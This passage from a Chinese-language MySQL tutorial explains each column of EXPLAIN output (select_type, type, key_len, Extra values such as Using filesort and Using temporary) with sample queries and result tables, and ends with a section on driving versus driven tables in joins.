`id` bigint(20) NOT NULL DEFAULT '0',\n  `age` int(20) DEFAULT NULL,\n  `code` int(20) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `uk_code` (`code`),\n  KEY `age_key` (`age`)\n) ENGINE=InnoDB DEFAULT CHARSET=gbk |\n+-------+-----------------------------------\n------+\n1 row in set (0.03 sec)\n```\n\n- SIMPLE：简单SELECT(不使用UNION或子查询等)\n```sql\nmysql> explain select * from t_a where id =1;\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+\n| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+\n|  1 | SIMPLE      | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL  |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+\n1 row in set, 1 warning (0.03 sec)\n```\n\n- PRIMARY：嵌套查询时最外层的查询\n```sql\nmysql> explain select * from t_a where num >(select num from t_a where id = 3);\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra                    |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n|  1 | PRIMARY     | t_a   | NULL       | range | num_key       | num_key | 5       | NULL  |    6 |   100.00 | Using where; Using index |\n|  2 | SUBQUERY    | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL                     |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n2 rows in set, 1 warning (0.03 sec)\n```\n- UNION：UNION中的第二个或后面的SELECT语句\n```sql\nmysql> explain select * from t_a where id =9 union all select * from t_a;\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------------+\n| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra       |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------------+\n|  1 | PRIMARY     | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL        |\n|  2 | UNION       | t_a   | NULL       | index | NULL          | num_key | 5       | NULL  |    9 |   100.00 | Using index |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------------+\n2 rows in set, 1 warning (0.04 sec)\n```\n\n- DEPENDENT UNION：UNION中的第二个或以后的SELECT语句，取决于外部查询\n```sql\nmysql> explain select * from t_a where id in (select id from t_a where id >8 union all select id from t_a where id =5);\n+----+--------------------+-------+------------+--------+---------------+---------+---------+-------+------+----------+--------------------------+\n| id | select_type        | table | partitions | type   | possible_keys | key     | key_len | ref   | rows | filtered | Extra                    |\n+----+--------------------+-------+------------+--------+---------------+---------+---------+-------+------+----------+--------------------------+\n|  1 | PRIMARY            | t_a   | NULL       | index  | NULL          | num_key | 5       | NULL  |    9 |   100.00 | Using where; Using index |\n|  2 | DEPENDENT SUBQUERY | t_a   | NULL       | eq_ref | PRIMARY       | PRIMARY | 8       | func  |    1 |   100.00 | Using where; Using index |\n|  3 | DEPENDENT UNION    | t_a   | NULL       | const  | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | Using index              |\n+----+--------------------+-------+------------+--------+---------------+---------+---------+-------+------+----------+--------------------------+\n3 rows in set, 1 warning (0.08 sec)\n```\n\n- UNION RESULT：UNION的结果\n```sql\nmysql> explain select num from t_a where id = 3 union select num from t_a where id =4;\n+----+--------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+-----------------+\n| id | select_type  | table      | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra           |\n+----+--------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+-----------------+\n|  1 | PRIMARY      | t_a        | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL            |\n|  2 | UNION        | t_a        | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL            |\n| NULL | UNION RESULT | <union1,2> | NULL       | ALL   | NULL          | NULL    | NULL    | NULL  | NULL |     NULL | Using temporary |\n+----+--------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+-----------------+\n3 rows in set, 1 warning (0.03 sec)\n```\n\n- SUBQUERY：子查询中的第一个选择\n```sql\nmysql> explain select * from t_a where num >(select num from t_a where id = 3);\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra                    |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n|  1 | PRIMARY     | t_a   | NULL       | range | num_key       | num_key | 5       | NULL  |    6 |   100.00 | Using where; Using index |\n|  2 | SUBQUERY    | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL                     |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n2 rows in set, 1 warning (0.03 sec)\n```\n\n- DEPENDENT SUBQUERY：子查询中的第一个选择，取决于外部查询\n```sql\nmysql> explain select * from t_a where num in(select num from t_a where id = 3 union select num from t_a where id =4);\n+----+--------------------+------------+------------+-------+-----------------+---------+---------+-------+------+----------+--------------------------+\n| id | select_type        | table      | partitions | type  | possible_keys   | key     | key_len | ref   | rows | filtered | Extra                    |\n+----+--------------------+------------+------------+-------+-----------------+---------+---------+-------+------+----------+--------------------------+\n|  1 | PRIMARY            | t_a        | NULL       | index | NULL            | num_key | 5       | NULL  |    9 |   100.00 | Using where; Using index |\n|  2 | DEPENDENT SUBQUERY | t_a        | NULL       | const | PRIMARY,num_key | PRIMARY | 8       | const |    1 |   100.00 | NULL                     |\n|  3 | DEPENDENT UNION    | t_a        | NULL       | const | PRIMARY,num_key | PRIMARY | 8       | const |    1 |   100.00 | NULL                     |\n| NULL | UNION RESULT       | <union2,3> | NULL       | ALL   | NULL            | NULL    | NULL    | NULL  | NULL |     NULL | Using temporary          |\n+----+--------------------+------------+------------+-------+-----------------+---------+---------+-------+------+----------+--------------------------+\n4 rows in set, 1 warning (0.12 sec)\n```\n\n- DERIVED：派生表（子查询中产生的临时表）\n```sql\nmysql> explain select a.id from (select id from t_a where id >8 union all select id from t_a where id =5) a;\n+----+-------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n| id | select_type | table      | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra                    |\n+----+-------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n|  1 | PRIMARY     | <derived2> | NULL       | ALL   | NULL          | NULL    | NULL    | NULL  |    3 |   100.00 | NULL                     |\n|  2 | DERIVED     | t_a        | NULL       | range | PRIMARY       | PRIMARY | 8       | NULL  |    1 |   100.00 | Using where; Using index |\n|  3 | UNION       | t_a        | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | Using index              |\n+----+-------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+\n3 rows in set, 1 warning (0.12 sec)\n```\n\n## partitions\n查询的记录所属于的分区，对于未分区表，该值为NULL。\n\n\n## table\n显示这一行的数据是关于哪张表的，有时是真实的表名字，有时也可能是以下几种结果\n- `<unionM,N>`: 指id为M,N行结果的并集\n- `<derivedN>`: 该行是指id值为n的行的派生表结果。派生表可能来自例如from子句中的子查询。\n- `<subqueryN>`: 该行是指id值为n的行的物化子查询的结果。\n\n## type\n连接使用了哪种类别,有无使用索引,常用的类型有：system, const, eq_ref, ref, range, index, ALL（从左到右，性能越来越差）\n- NULL：MySQL在优化过程中分解语句，执行时甚至不用访问表或索引，例如从一个索引列里选取最小值可以通过单独索引查找完成\n- system：这个表（也可能是查询出来的临时表）只有一行数据 (= system table). 是const中的一个特例\n- const：表最多有一个匹配行，它将在查询开始时被读取。因为仅有一行，在这行的列值可被优化器剩余部分认为是常数。const表很快，因为它们只读取一次！const用于查询条件为PRIMARY KEY或UNIQUE索引并与常数值进行比较时的所有部分。\n在下面的查询中，tbl_name可以用于const表：\n```sql\nSELECT * from tbl_name WHERE primary_key=1；\nSELECT * from tbl_name WHERE primary_key_part1=1和 primary_key_part2=2；\n\n--例子\nmysql> explain select * from t_a where id =1;\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+\n| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+\n|  1 | SIMPLE      | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL  |\n+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+\n1 row in set, 1 warning (0.07 sec)\n```\n- eq_ref：对于前几个表中的每一行组合，最多只能从该组合中中读取一行时。除了system和const，这是最好的连接类型。当连接使用索引的所有部分，并且索引是主键或唯一非空索引时，将使用它。eq_ref可以用于使用= 操作符比较的带索引的列。比较值可以为常量或一个使用在该表前面所读取的表的列的表达式。\n在下面的例子中，MySQL可以使用eq_ref联接去处理ref_tables：\n```sql\nSELECT * FROM ref_table,other_table\n  WHERE ref_table.key_column=other_table.column;\n\nSELECT * FROM ref_table,other_table\n  WHERE ref_table.key_column_part1=other_table.column\n  AND ref_table.key_column_part2=1;\n\n--例子（t_b为t_a的复制表，表结构相同）\nmysql> explain select * from t_a,t_b where t_a.code=t_b.code;\n+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+\n| id | select_type | table | partitions | type   | possible_keys | key     | key_len | ref           | rows | filtered | Extra |\n+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+\n|  1 | SIMPLE      | t_a   | NULL       | ALL    | uk_code       | NULL    | NULL    | NULL          |    9 |   100.00 | NULL  |\n|  1 | SIMPLE      | t_b   | NULL       | eq_ref | uk_code       | uk_code | 4       | test.t_a.code |    1 |   100.00 | NULL  |\n+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+\n2 rows in set, 1 warning (0.03 sec)\n```\n- ref：对于每个来自于前面的表的行组合，所有有匹配索引值的行将从这组合中读取。如果联接只使用键的最左边的前缀，或如果键不是UNIQUE或PRIMARY KEY（换句话说，如果联接不能基于关键字查询结果为单个行的话），则使用ref。如果使用的键仅仅匹配少量行，该联接类型是不错的。ref可以用于使用=或<=>操作符的带索引的列。\n在下面的例子中，MySQL可以使用ref联接来处理ref_tables：\n```sql\nSELECT * FROM ref_table WHERE key_column=expr;\n\nSELECT * FROM ref_table,other_table\n  WHERE ref_table.key_column=other_table.column;\n\nSELECT * FROM ref_table,other_table\n  WHERE ref_table.key_column_part1=other_table.column\n  AND ref_table.key_column_part2=1;\n\n--例子（t_b为t_a的复制表，表结构相同）\nmysql> explain select * from t_a,t_b where t_a.age=t_b.age;\n+----+-------------+-------+------------+------+---------------+---------+---------+--------------+------+----------+-------------+\n| id | select_type | table | partitions | type | possible_keys | key     | key_len | ref          | rows | filtered | Extra       |\n+----+-------------+-------+------------+------+---------------+---------+---------+--------------+------+----------+-------------+\n|  1 | SIMPLE      | t_a   | NULL       | ALL  | age_key       | NULL    | NULL    | NULL         |    9 |   100.00 | Using where |\n|  1 | SIMPLE      | t_b   | NULL       | ref  | age_key       | age_key | 5       | test.t_a.age |    1 |   100.00 | NULL        |\n+----+-------------+-------+------------+------+---------------+---------+---------+--------------+------+----------+-------------+\n2 rows in set, 1 warning (0.03 sec)\n```\n- fulltext：使用FULLTEXT索引执行连接\n- ref_or_null：该联接类型ref类似，但是添加了MySQL可以专门搜索包含NULL值的行。在解决子查询中经常使用该联接类型的优化。\n在下面的例子中，MySQL可以使用ref_or_null联接来处理ref_tables：\n```sql\nSELECT * FROM ref_table\n  WHERE key_column=expr OR key_column IS NULL;\n\n--例子\nmysql> explain select * from t_a where t_a.age =3 or t_a.age is null;\n+----+-------------+-------+------------+-------------+---------------+---------+---------+-------+------+----------+-----------------------+\n| id | select_type | table | partitions | type        | possible_keys | key     | key_len | ref   | rows | filtered | Extra                 |\n+----+-------------+-------+------------+-------------+---------------+---------+---------+-------+------+----------+-----------------------+\n|  1 | SIMPLE      | t_a   | NULL       | ref_or_null | age_key       | age_key | 5       | const |    2 |   100.00 | Using index condition |\n+----+-------------+-------+------------+-------------+---------------+---------+---------+-------+------+----------+-----------------------+\n1 row in set, 1 warning (0.03 sec)\n```\n\n- index_merge：该联接类型表示使用了索引合并优化方法。在这种情况下，key列包含了使用的索引的清单，key_len包含了使用的索引的最长的关键元素。\n```sql\nSELECT * FROM ref_table\n  WHERE idx1=expr1 OR idx2 =expr2;\n\n--例子\nmysql> explain select * from t_a where t_a.code =3 or t_a.age = 3;\n+----+-------------+-------+------------+-------------+-----------------+-----------------+---------+------+------+----------+-------------------------------------------+\n| id | select_type | table | partitions | type        | possible_keys   | key             | key_len | ref  | rows | filtered | Extra                                     |\n+----+-------------+-------+------------+-------------+-----------------+-----------------+---------+------+------+----------+-------------------------------------------+\n|  1 | SIMPLE      | t_a   | NULL       | index_merge | uk_code,age_key | uk_code,age_key | 4,5     | NULL |    2 |   100.00 | Using union(uk_code,age_key); Using where |\n+----+-------------+-------+------------+-------------+-----------------+-----------------+---------+------+------+----------+-------------------------------------------+\n1 row in set, 1 warning (0.03 sec)\n```\n\n- unique_subquery：该类型替换了下面形式的IN子查询的ref：\n```sql\nvalue IN (SELECT primary_key FROM single_table WHERE some_expr)\n```\nunique_subquery是一个索引查找函数，可以完全替换子查询，效率更高。\n\n- index_subquery：该联接类型类似于unique_subquery。可以替换IN子查询，但只适合下列形式的子查询中的非唯一索引：\n```sql\nvalue IN (SELECT key_column FROM single_table WHERE some_expr)\n```\n\n- range：只检索给定范围的行，使用一个索引来选择行。key列显示使用了哪个索引。key_len包含所使用索引的最长关键元素。在该类型中ref列为NULL。当使用=、<>、>、>=、<、<=、IS NULL、<=>、BETWEEN或者IN操作符，用常量比较关键字列时，可以使用range\n```sql\nmysql> explain select * from t_a where id > 8;\n+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+-------------+\n| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref  | rows | filtered | Extra       |\n+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+-------------+\n|  1 | SIMPLE      | t_a   | NULL       | range | PRIMARY       | PRIMARY | 8       | NULL |    1 |   100.00 | Using where |\n+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+-------------+\n1 row in set, 1 warning (0.03 sec)\n```\n\n- index：该联接类型与ALL相同，除了只有索引树被扫描。这通常比ALL快，因为索引文件通常比数据文件小。当查询只使用作为单索引一部分的列时，MySQL可以使用该联接类型。\n\n- ALL：对于每个来自于先前的表的行组合，进行完整的表扫描。如果表是第一个没标记const的表，这通常不好，并且通常在它情况下很差。通常可以增加更多的索引而不要使用ALL，使得行能基于前面的表中的常数值或列值被检索出。\n\n## possible_keys\npossible_keys列指出MySQL能使用哪个索引在该表中找到行。注意，该列完全独立于EXPLAIN输出所示的表的次序。这意味着在possible_keys中的某些键实际上不能按生成的表次序使用。\n\n如果该列是NULL，则没有相关的索引。在这种情况下，可以通过检查WHERE子句看是否它引用某些列或适合索引的列来提高你的查询性能。如果是这样，创造一个适当的索引并且再次用EXPLAIN检查查询\n\n## key\nkey列显示MySQL实际决定使用的键（索引）。如果没有选择索引，键是NULL。要想强制MySQL使用或忽视possible_keys列中的索引，在查询中使用FORCE INDEX、USE INDEX或者IGNORE INDEX。\n\n## key_len\nkey_len列显示MySQL决定使用的键长度。如果键是NULL，则长度为NULL。\n使用的索引的长度。在不损失精确性的情况下，长度越短越好\n例如索引`test`是`class`列与`nameid`列的复合索引, 其中`class`列为int型,占4个字节，`nameid`为smallint型，占2个字节。所以`test`索引的key_len为6\n\n## ref\nref列显示使用哪个列或常数与key一起从表中选择行。\n\n## rows\nrows列显示MySQL认为它执行查询时必须检查的行数。\n\n## Extra\n该列包含MySQL解决查询的详细信息,下面详细.\n\n### `Distinct`\n一旦MYSQL找到了与行相联合匹配的行，就不再搜索了\n\n### `Not exists`\n当我们使用左（外）连接时，如果WHERE子句中包含要求被驱动表的某个列等于NULL值的搜索条件，而且那个列又是不允许存储NULL值的，那么在该表的执行计划的Extra列就会提示Not exists额外信息，比如这样：\n```sql\nmysql> EXPLAIN SELECT * FROM s1 LEFT JOIN s2 ON s1.key1 = s2.key1 WHERE s2.id IS NULL;\n+----+-------------+-------+------------+------+---------------+----------+---------+-------------------+------+----------+-------------------------+\n| id | select_type | table | partitions | type | possible_keys | key      | key_len | ref               | rows | filtered | Extra                   |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------------------+------+----------+-------------------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | NULL          | NULL     | NULL    | NULL              | 9688 |   100.00 | NULL                    |\n|  1 | SIMPLE      | s2    | NULL       | ref  | idx_key1      | idx_key1 | 303     | xiaohaizi.s1.key1 |    1 |    10.00 | Using where; Not exists |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------------------+------+----------+-------------------------+\n2 rows in set, 1 warning (0.00 sec)\n``` \n上述查询中s1表是驱动表，s2表是被驱动表，s2.id列是不允许存储NULL值的，而WHERE子句中又包含s2.id IS NULL的搜索条件，这意味着必定是驱动表的记录在被驱动表中找不到匹配ON子句条件的记录才会把该驱动表的记录加入到最终的结果集，所以对于某条驱动表中的记录来说，如果能在被驱动表中找到1条符合ON子句条件的记录，那么该驱动表的记录就不会被加入到最终的结果集，也就是说我们没有必要到被驱动表中找到全部符合ON子句条件的记录，这样可以稍微节省一点性能。\n\n- `Range checked for each`：没有找到理想的索引，因此对于从前面表中来的每一个行组合，MYSQL检查使用哪个索引，并用它来从表中返回行。这是使用索引的最慢的连接之一\n\n### `Using filesort`\n有一些情况下对结果集中的记录进行排序是可以使用到索引的，比如下边这个查询：\n```sql\nmysql> EXPLAIN SELECT * FROM s1 ORDER BY key1 LIMIT 10;\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-------+\n| id | select_type | table | partitions | type  | possible_keys | key      | key_len | ref  | rows | filtered | Extra |\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-------+\n|  1 | SIMPLE      | s1    | NULL       | index | NULL          | idx_key1 | 303     | NULL |   10 |   100.00 | NULL  |\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-------+\n1 row in set, 1 warning (0.03 sec)\n```   \n这个查询语句可以利用idx_key1索引直接取出key1列的10条记录，然后再进行回表操作就好了。但是很多情况下排序操作无法使用到索引，只能在内存中（记录较少的时候）或者磁盘中（记录较多的时候）进行排序，设计MySQL的大叔把这种在内存中或者磁盘上进行排序的方式统称为文件排序（英文名：filesort）。如果某个查询需要使用文件排序的方式执行查询，就会在执行计划的Extra列中显示Using filesort提示，比如这样：\n```sql\nmysql> EXPLAIN SELECT * FROM s1 ORDER BY common_field LIMIT 10;\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+\n| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra          |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 9688 |   100.00 | Using filesort |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+\n1 row in set, 1 warning (0.00 sec)\n``` \n需要注意的是，如果查询中需要使用filesort的方式进行排序的记录非常多，那么这个过程是很耗费性能的，我们最好想办法将使用文件排序的执行方式改为使用索引进行排序。\n\n### `Using index`\n当我们的查询列表以及搜索条件中只包含属于某个索引的列，也就是在可以使用索引覆盖的情况下，在Extra列将会提示该额外的信息。如果为Using index, 则表示不需要回表操作，比方说下边这个查询中只需要用到idx_key1而不需要回表操作：\n```sql\nmysql> EXPLAIN SELECT key1 FROM s1 WHERE key1 = 'a';\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n| id | select_type | table | partitions | type | possible_keys | key      | key_len | ref   | rows | filtered | Extra       |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n|  1 | SIMPLE      | s1    | NULL       | ref  | idx_key1      | idx_key1 | 303     | const |    8 |   100.00 | Using index |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n1 row in set, 1 warning (0.00 sec)\n```\n\n### `Using index condition`\n有些搜索条件中虽然出现了索引列，但却不能使用到索引，比如下边这个查询：\n```sql\nSELECT * FROM s1 WHERE key1 > 'z' AND key1 LIKE '%a';\n``` \n其中的`key1 > 'z'`可以使用到索引，但是`key1 LIKE '%a'`却无法使用到索引，在以前版本的MySQL中，是按照下边步骤来执行这个查询的：\n- 先根据`key1 > 'z'`这个条件，从二级索引idx_key1中获取到对应的二级索引记录。\n- 根据上一步骤得到的二级索引记录中的主键值进行回表，找到完整的用户记录再检测该记录是否符合`key1 LIKE '%a'`这个条件，将符合条件的记录加入到最后的结果集。\n但是虽然key1 LIKE '%a'不能组成范围区间参与range访问方法的执行，但这个条件毕竟只涉及到了key1列，所以设计MySQL的大叔把上边的步骤改进了一下：\n- 先根据`key1 > 'z'`这个条件，定位到二级索引idx_key1中对应的二级索引记录。\n- 对于指定的二级索引记录，先不着急回表，而是先检测一下该记录是否满足`key1 LIKE '%a'`这个条件，如果这个条件不满足，则该二级索引记录压根儿就没必要回表。\n- 对于满足`key1 LIKE '%a'`这个条件的二级索引记录执行回表操作。\n我们说回表操作其实是一个随机IO，比较耗时，所以上述修改虽然只改进了一点点，但是可以省去好多回表操作的成本。设计MySQL的大叔们把他们的这个改进称之为`索引条件下推（英文名：Index Condition Pushdown）`。\n\n如果在查询语句的执行过程中将要使用`索引条件下推`这个特性，在Extra列中将会显示`Using index condition`，比如这样：\n```sql\nmysql> EXPLAIN SELECT * FROM s1 WHERE key1 > 'z' AND key1 LIKE '%b';\n  +----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-----------------------+\n  | id | select_type | table | partitions | type  | possible_keys | key      | key_len | ref  | rows | filtered | Extra                 |\n  +----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-----------------------+\n  |  1 | SIMPLE      | s1    | NULL       | range | idx_key1      | idx_key1 | 303     | NULL |  266 |   100.00 | Using index condition |\n  +----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-----------------------+\n  1 row in set, 1 warning (0.01 sec)\n``` \n\n### `Using temporary`\n在许多查询的执行过程中，MySQL可能会借助临时表来完成一些功能，比如去重、排序之类的，比如我们在执行许多包含DISTINCT、GROUP BY、UNION等子句的查询过程中，如果不能有效利用索引来完成查询，MySQL很有可能寻求通过建立内部的临时表来执行查询。如果查询中使用到了内部的临时表，在执行计划的Extra列将会显示Using temporary提示，比方说这样：\n```sql\nmysql> EXPLAIN SELECT DISTINCT common_field FROM s1;\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra           |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 9688 |   100.00 | Using temporary |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n1 row in set, 1 warning (0.00 sec)\n``` \n再比如：\n```sql\nmysql> EXPLAIN SELECT common_field, COUNT(*) AS amount FROM s1 GROUP BY common_field;\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+---------------------------------+\n| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra                           |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+---------------------------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 9688 |   100.00 | Using temporary; Using filesort |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+---------------------------------+\n1 row in set, 1 warning (0.00 sec)\n``` \n不知道大家注意到没有，上述执行计划的Extra列不仅仅包含Using temporary提示，还包含Using filesort提示，可是我们的查询语句中明明没有写ORDER BY子句呀？这是因为MySQL会在包含GROUP BY子句的查询中默认添加上ORDER BY子句，也就是说上述查询其实和下边这个查询等价：\n```sql\nEXPLAIN SELECT common_field, COUNT(*) AS amount FROM s1 GROUP BY common_field ORDER BY common_field;\n```\n如果我们并不想为包含GROUP BY子句的查询进行排序，需要我们显式的写上ORDER BY NULL，就像这样：\n```sql\nmysql> EXPLAIN SELECT common_field, COUNT(*) AS amount FROM s1 GROUP BY common_field ORDER BY NULL;\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra           |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 9688 |   100.00 | Using temporary |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n1 row in set, 1 warning (0.00 sec)\n``` \n这回执行计划中就没有Using filesort的提示了，也就意味着执行查询时可以省去对记录进行文件排序的成本了。\n\n另外，执行计划中出现Using temporary并不是一个好的征兆，因为建立与维护临时表要付出很大成本的，所以我们最好能使用索引来替代掉使用临时表，比方说下边这个包含GROUP BY子句的查询就不需要使用临时表：\n```sql\nmysql> EXPLAIN SELECT key1, COUNT(*) AS amount FROM s1 GROUP BY key1;\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-------------+\n| id | select_type | table | partitions | type  | possible_keys | key      | key_len | ref  | rows | filtered | Extra       |\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-------------+\n|  1 | SIMPLE      | s1    | NULL       | index | idx_key1      | idx_key1 | 303     | NULL | 9688 |   100.00 | Using index |\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-------------+\n1 row in set, 1 warning (0.00 sec)\n``` \n从Extra的Using index的提示里我们可以看出，上述查询只需要扫描idx_key1索引就可以搞定了，不再需要临时表了。\n\n### `Using where`\n当我们使用全表扫描来执行对某个表的查询，并且该语句的WHERE子句中有针对该表的搜索条件时，在Extra列中会提示上述额外信息。比如下边这个查询：\n```sql\nmysql> EXPLAIN SELECT * FROM s1 WHERE common_field = 'a';\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+\n| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra       |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 9688 |    10.00 | Using where |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+\n1 row in set, 1 warning (0.01 sec)\n``` \n当使用索引访问来执行对某个表的查询，并且该语句的WHERE子句中有除了该索引包含的列之外的其他搜索条件时，在Extra列中也会提示上述额外信息。比如下边这个查询虽然使用idx_key1索引执行查询，但是搜索条件中除了包含key1的搜索条件key1 = 'a'，还有包含common_field的搜索条件，所以Extra列会显示Using where的提示：\n```sql\nmysql> EXPLAIN SELECT * FROM s1 WHERE key1 = 'a' AND common_field = 'a';\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n| id | select_type | table | partitions | type | possible_keys | key      | key_len | ref   | rows | filtered | Extra       |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n|  1 | SIMPLE      | s1    | NULL       | ref  | idx_key1      | idx_key1 | 303     | const |    8 |    10.00 | Using where |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n1 row in set, 1 warning (0.00 sec)\n```\n\n# 表连接中的驱动表与被驱动表\n什么是驱动表，什么是被驱动表，这两个概念在查询中有时容易让人搞混，有下面几种情况，大家需要了解。\n- 当连接查询没有where条件时，左连接查询时，前面的表是驱动表，后面的表是被驱动表，右连接查询时相反，内连接查询时，哪张表的数据较少，哪张表就是驱动表\n- 当连接查询有where条件时，带where条件的表是驱动表，否则是被驱动表\n\n\n怎么确定我们上面的两种情况呢，执行计划是不会骗人的，我们针对上面情况分别看看执行计划给出的答案, 因为explain语句输出中靠前的表是驱动表\n\n首先第一种情况，student表中3条数据，score表中2条数据，但两张表中只有一条数据是关联的(编号是1),看如下SQL查询\n```sql\n//左连接查询\nexplain select * from student s1 left join score s2 on s1.no = s2.no\n//右连接查询\nexplain select * from student s1 right join score s2 on s1.no = s2.no\n//内连接查询\nexplain select * from student s1 inner join score s2 on s1.no = s2.no\n```\n**执行计划输出中靠前的表是驱动表**，我们看下面三种图中，是不是全度符合情况一，第一张图中s1是驱动表，第二张图中s2是驱动表，第三种途中s2是驱动表\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183125.png)\n\n其次第二种情况，还是上面三种SQL语句，我们分别加上where条件，再来看看执行计划的结果是什么样呢？\n```sql\n//左连接查询\nexplain select * from student s1 left join score s2 on s1.no = s2.no where s2. no = 1\n//右连接查询\nexplain select * from student s1 right join score s2 on s1.no = s2.no where s1.no = 1\n//内连接查询\nexplain select * from student s1 inner join score s2 on s1.no = s2.no where s1.no = 1\n```\n我们看下面三种执行计划结果，全都以where条件为准了，而且跟上面情况一的都相反了,因此情况二也是得到了验证.\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183135.png)\n\n# 